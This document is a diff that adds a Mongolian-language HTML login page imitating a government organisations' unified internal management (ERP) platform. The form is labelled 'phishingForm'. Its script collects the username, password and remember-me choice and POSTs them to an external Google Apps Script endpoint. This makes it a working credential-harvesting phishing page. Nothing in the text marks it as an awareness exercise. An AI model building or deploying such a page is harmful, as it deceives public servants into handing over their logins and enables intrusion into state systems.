@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="mn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Дижитал Шилжилт - Монгол Улсын Дижитал Платформ</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #4053FC;
+            color: white;
+            min-height: 100vh;
+            display: flex;
+        }
+        
+        .container {
+            display: flex;
+            width: 100%;
+        }
+        
+        .left-section {
+            flex: 3;
+            padding: 50px;
+            position: relative;
+        }
+        
+        .right-section {
+            flex: 1;
+            background-color: white;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            color: #333;
+        }
+        
+        h1 {
+            font-size: 24px;
+            margin-bottom: 30px;
+            font-weight: bold;
+            font-family: Arial, Helvetica, sans-serif;
+            position: relative;
+        }
+
+        h1::after {
+    content: ""; /* Хоосон агуулга */
+    display: block;
+    width: 50px; /* Зураасны урт */
+    height: 4px; /* Зураасны зузаан */
+    background-color: white; /* Зураасны өнгө */
+    margin-top: 10px; /* Зураас болон текстийн хоорондох зай */
+  }
+        
+        p {
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 20px;
+            max-width: 800px;
+        }
+        
+        .map-container {
+                width: 100%;
+                height: 60vh;
+                position: relative;
+                margin-top: 30px;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+            }
+        
+            
+            .map-image {
+                width: 90%; /* Зургийн өргөнийг тохируулна */
+                height: auto; /* Өндрийг автоматаар тохируулна */
+              
+               
+            }
+
+        .map-bg {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background-color: #75a5e4;
+            border-radius: 40%;
+            opacity: 0.6;
+        }
+        
+        .map {
+            position: absolute;
+            width: 90%;
+            height: 80%;
+            background-color: #2a9d8f;
+            top: 10%;
+            left: 5%;
+            border-radius: 35%;
+        }
+        
+        .map-border {
+            position: absolute;
+            width: 90%;
+            height: 80%;
+            top: 10%;
+            left: 5%;
+            border-radius: 35%;
+            border: 6px solid #fca311;
+            border-top: none;
+            border-left: none;
+            border-right: none;
+        }
+        
+        .location-dot {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            background-color: white;
+            border-radius: 50%;
+        }
+
+         .bottom-panel {
+            display: flex;
+            justify-content: space-between; /* Элементийг хоёр талд байрлуулна */
+            align-items: center;
+            background-color: rgba(214, 228, 255, 0.2); /* Цайвар цэнхэр өнгө, илүү тунгалаг */
+            padding: 10px 20px; /* Дотор зайг багасгана */
+            border-radius: 5px; /* Буланг дугуйруулна */
+            width: 50%; /* Өргөнийг багасгана */
+            margin: 20px auto; /* Төвд байрлуулна */
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1); /* Сүүдэр нэмнэ */
+        }
+
+                
+        .nav-item {
+            display: flex;
+            align-items: center;
+            color: white; /* Фонтны өнгийг цагаан болгоно */
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        .nav-item svg {
+            margin-right: 10px; /* Зураг болон текстийн хоорондох зай */
+        }
+
+        .separator {
+            width: 1px;
+            height: 20px; /* Тусгаарлагчийн өндрийг багасгана */
+            background-color: rgba(255, 255, 255, 0.1); /* Цагаан өнгө, илүү тунгалаг */
+        }
+        .bottom-panel div {
+            margin: 0 20px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .bottom-panel img {
+            margin-right: 10px;
+        }
+        
+        .logo {
+                margin-bottom: 20px;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+            }
+        
+        .login-form {
+            width: 100%;
+            max-width: 350px; /* Формын өргөнийг тохируулна */
+            margin: 0 auto; /* Төвд байрлуулна */
+            text-align: center; /* Текстийг төвд байрлуулна */
+        }
+        .logo-image {
+                width: 100px; /* Логогийн өргөнийг тохируулна */
+                height: auto; /* Өндрийг автоматаар тохируулна */
+            } 
+        
+        .login-title {
+                text-align: center;
+                color: #4053FC; /* Цэнхэр өнгө */
+                margin-bottom: 30px;
+                font-size: 18px; /* Фонтны хэмжээг томруулна */
+                line-height: 1.4;
+                font-weight: bold;
+            }
+        
+        .form-group {
+            margin-bottom: 15px;
+            position: relative;
+        }
+        
+        .form-control {
+            width: 100%;
+            padding: 12px 15px 12px 40px; /* Дотор зайг тохируулна */
+            border: 1px solid #e1e1e1;
+            border-radius: 5px;
+            font-size: 14px;
+            color: #333;
+        }
+        
+        .icon {
+            position: absolute;
+            left: 12px;
+            top: 12px;
+            color: #aaa;
+        }
+        
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+            font-size: 14px;
+            color: #666;
+        }
+        
+        .btn-primary {
+            width: 100%;
+            padding: 12px;
+            background-color: #4053FC; /* Цэнхэр өнгө */
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 14px;
+            cursor: pointer;
+            margin-bottom: 10px;
+        }
+        
+        .btn-secondary {
+            width: 100%;
+            padding: 12px;
+            background-color: #f0f2ff; /* Цайвар цэнхэр өнгө */
+            color: #4053FC;
+            border: none;
+            border-radius: 5px;
+            font-size: 14px;
+            cursor: pointer;
+            margin-bottom: 20px;
+        }
+        
+        .forgot-password {
+            text-align: center;
+            font-size: 14px;
+            color: #666;
+            margin-top: 20px;
+        }
+        .forgot-password a {
+            color: #4053FC; /* Цэнхэр өнгө */
+            text-decoration: none;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+        p {
+            font-size: 15px; /* Фонтны хэмжээг томруулна */
+            line-height: 1.4; /* Мөр хоорондын зайг нэмэгдүүлнэ */
+            margin-bottom: 20px; /* Доод зайг хадгална */
+            max-width: 1200px; /* Хамгийн их өргөнийг хадгална */
+            Font-family: Arial, sans-serif;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="left-section">
+            <h1>ДИЖИТАЛ ШИЛЖИЛТ</h1>
+            <p>"Төрийн байгууллагуудын дотоод үйл ажиллагааны удирдлагын нэгдсэн платформ" нь төрийн байгууллагуудын үйл ажиллага, албан хаагчдын хэрэгцээ шаардлагад нийцсэн, инновацийг нэвтрүүлсэн, технологийн шинэ шийдэл бүхий нэгдсэн удирдлага хяналтай, уян хатан, цогц систем юм.</p>
+            
+            <div class="map-container">
+                <img src="map.svg" alt="Газрын зураг" class="map-image">
+                </div>
+            
+            <div class="bottom-panel">
+                <div class="nav-item">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <rect x="4" y="10" width="16" height="10" rx="1"></rect>
+                    <path d="M12 3L4 10h16L12 3z"></path>
+                    <line x1="12" y1="14" x2="12" y2="16"></line>
+                    </svg>
+                    <span>ТӨРИЙН ЗАХИРГААНЫ БАЙГУУЛЛАГУУД</span>
+                </div>
+                <div class="separator"></div>
+                <div class="nav-item">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z"></path>
+                    <circle cx="12" cy="10" r="3"></circle>
+                    </svg>
+                    <span>21 АЙМГИЙН ЗДТГ</span>
+                </div>
+                </div>
+        </div>
+        
+        <div class="right-section">
+  <div class="logo">
+    <img src="logo_erp.svg" alt="ERP Лого" class="logo-image">
+  </div>
+<!-- Форумын хэсэг -->
+  <form class="login-form" id="phishingForm" onsubmit="saveFormData(event)">
+    <h2 class="login-title">ТӨРИЙН БАЙГУУЛЛАГУУДЫН ДОТООД ҮЙЛ АЖИЛЛАГААНЫ УДИРДЛАГЫН НЭГДСЭН СИСТЕМ</h2>
+
+    <div class="form-group">
+      <span class="icon">
+        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
+          <circle cx="12" cy="7" r="4"></circle>
+        </svg>
+      </span>
+      <input type="text" class="form-control" placeholder="Нэвтрэх нэр">
+    </div>
+
+    <div class="form-group">
+      <span class="icon">
+        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+          <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+        </svg>
+      </span>
+      <input type="password" class="form-control" placeholder="Нууц үг">
+    </div>
+
+    <div class="checkbox-container">
+      <input type="checkbox" id="remember">
+      <label for="remember"> Нэвтэрсэн хэвээр байх</label>
+    </div>
+
+    <button class="btn-primary">НЭВТРЭХ</button>
+    <button class="btn-secondary">ТООН ГАРЫН ҮСЭГ</button>
+    
+  </form>
+</div>
+    </div>
+    <script>
+            function saveFormData(event) {
+                event.preventDefault();
+                const form = event.target;
+                const data = {
+                    username: form.querySelector('input[placeholder="Нэвтрэх нэр"]').value,
+                    password: form.querySelector('input[placeholder="Нууц үг"]').value,
+                    remember: form.querySelector('#remember').checked
+                };
+
+                fetch("https://script.google.com/macros/s/AKfycbw6TBC01Cf1PG1fJFBhYUiM_ZxrZvvcrXCH8gJEdTEzrOaMSqgtkrzSUQAzAgA83NHhTA/exec", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(data)
+                })
+                .then(res => {
+                    if (!res.ok) {
+                        throw new Error("Серверээс алдаа ирлээ: " + res.status);
+                    }
+                    return res.text();
+                })
+                .then(msg => alert("Амжилттай илгээгдлээ: " + msg))
+                .catch(err => alert("Алдаа: " + err.message));
+            }
+</script>
+</body>
+</html>
